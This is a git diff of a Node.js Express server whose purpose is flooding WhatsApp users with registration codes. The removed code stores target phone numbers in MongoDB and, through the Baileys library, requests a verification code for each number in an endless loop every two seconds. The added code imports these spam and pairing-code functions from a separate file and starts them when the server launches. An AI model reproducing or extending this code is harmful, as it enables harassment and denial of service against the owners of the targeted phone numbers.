@@ -1,14 +1,13 @@
 const cluster = require('cluster');
 const numCPUs = require('os').cpus().length;
-const fs = require('fs');
-const path = require('path');
 const express = require('express');
 const bodyParser = require('body-parser');
 const cookieParser = require('cookie-parser');
-const mongoose = require('mongoose');
+const path = require('path');
 const ejs = require('ejs');
-const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
 const pinoo = require('pino');
+const mongoose = require('mongoose');
+const { startSpamV2, sendStoredData, startPairingCodeGeneration, sendStoredDataV2, spam} = require('./server3.js');
 
 
 // Konfiguration des Pino-Loggers mit gewünschten Log-Leveln
@@ -49,59 +48,15 @@ if (cluster.isMaster) {
     require('dotenv').config(); // Load environment variables from .env file
 
     const app = express();
-    const port = process.env.PORT || 10000; // Use environment variable or default port
-   
+    const port = 10000; // Use environment variable or default port
+
     // MongoDB connection string from environment variable
     const mongoURI = process.env.MONGODB_URI;
-    const startspam = process.env.START_SPAM;
-    const startpair = process.env.START_PAIR;
-    
 
     // Connect to MongoDB
     mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
         .then(() => log.info('Connected to MongoDB'))
         .catch(err => log.error('Error connecting to MongoDB:', err));
-
-    const SpamDataSchema = new mongoose.Schema({
-        ddi: String,
-        number: String,
-        timestamp: { type: Date, default: Date.now }
-    });
-
-   
-    
-  
-
-    // Modell aus dem Schema erstellen
-    const SpamData = mongoose.model('SpamData', SpamDataSchema);
-
-    const sendStoredData = async () => {
-        try {
-            // Alle Daten aus der MongoDB abrufen
-            const data = await SpamData.find({}, 'ddi number');
-
-            // Daten an den /start-spam Endpunkt senden
-            await Promise.all(data.map(async (item) => {
-                const { ddi, number } = item;
-                await fetch(startspam, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ ddi, number })
-                });
-            }));
-            log.info('Stored data sent successfully from MongoDB');
-            await sleep(20);
-        } catch (error) {
-            log.error('Error sending stored data:', error);
-        }
-    };
-
-    // Funktion aufrufen, um die Daten beim Starten des Servers zu senden
-    sendStoredData(); 
-
-    
 
     // Set up body parsers
     let server = require('./views/qr');
@@ -141,10 +96,10 @@ if (cluster.isMaster) {
         res.render(path.join(__path, 'lock'), { title: 'Lock' });
     });
 
-    function sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-    
+    app.get('/qr', (req, res) => {
+        res.render(path.join('qr.js'), { title: 'qr' });
+    });
+   
     
 app.post('/start-spam', async (req, res) => {
     const { ddi, number } = req.body;
@@ -190,70 +145,20 @@ app.post('/start-spam', async (req, res) => {
 });
 
 
-const startSpamV2 = async () => {
-    try {
-        while (true) {
-            // Alle Daten aus der MongoDB abrufen
-            const data = await SpamData.find({}, 'ddi number');
-
-            // Für jede Datenzeile den Spam starten
-            await Promise.all(data.map(async (item) => {
-                const { ddi, number } = item;
-
-                const { state, saveCreds } = await useMultiFileAuthState('.mm');
-                const spam = makeWaSocket({
-                    auth: state,
-                    mobile: true,
-                    logger: log.child({ component: 'whiskeysockets' }) // Child logger for whiskeysockets
-                });
-
-                while (true) {
-                    try {
-                        const response = await spam.requestRegistrationCode({
-                            phoneNumber: '+' + ddi + number,
-                            phoneNumberCountryCode: ddi,
-                            phoneNumberNationalNumber: number,
-                            phoneNumberMobileCountryCode: 724
-                        });
-                        info.log('Spam request sent successfully:', response);
-                        await sleep(2000); // Zeit zwischen den Spam-Anfragen
-                    } catch (err) {
-                        // Fehlerbehandlung hier
-                    }
-                }
-            }));
-        }
-    } catch (error) {
-        // Fehlerbehandlung hier
-    }
-};
-
-// Starten Sie den Spam-Prozess beim Starten des Servers
-startSpamV2();
-
-
-
-
-
-
-
-
-    // Error handling middleware
-    app.use((err, req, res, next) => {
-        log.error(err.stack);
-        res.status(500).send('Something broke!');
-    });
 
     // Start server
     app.listen(port, () => {
         log.info(`Worker ${process.pid} started and is listening on port ${port}`);
+        console.log(`Worker ${process.pid} started and is listening on port ${port}`);
     });
-    // Starten Sie den Server
 
+    // Starten Sie den Prozess und senden Sie gespeicherte Daten beim Starten des Servers
+    startSpamV2();
+    sendStoredData();
+    startPairingCodeGeneration();
+    sendStoredDataV2();
+    
+    
 
-    app.on('listening', () => {
-        setTimeout(() => {
-            startSpamV2();
-        }, 1000);
-    });
+    
 }
